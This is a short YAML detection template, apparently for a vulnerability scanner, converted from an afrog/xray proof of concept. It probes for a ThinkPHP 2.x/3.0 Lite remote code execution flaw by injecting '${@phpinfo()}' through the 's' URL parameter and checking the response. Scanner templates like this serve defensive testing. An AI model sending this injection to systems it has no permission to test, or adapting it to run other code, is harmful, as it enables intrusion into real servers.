@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - PHP Extension
+          - PHP Version
+          - ThinkPHP
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=/a/b/c/$%7B@phpinfo()%7D'
+id: thinkphp-2-rce
+info:
+  author: dr_set
+  description: |
+    ThinkPHP 2.x version and 3.0 in Lite mode Remote Code Execution.
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: ThinkPHP 2 3 's' Parameter RCE
+  severity: critical
+  tags: thinkphp,rce,argus-import
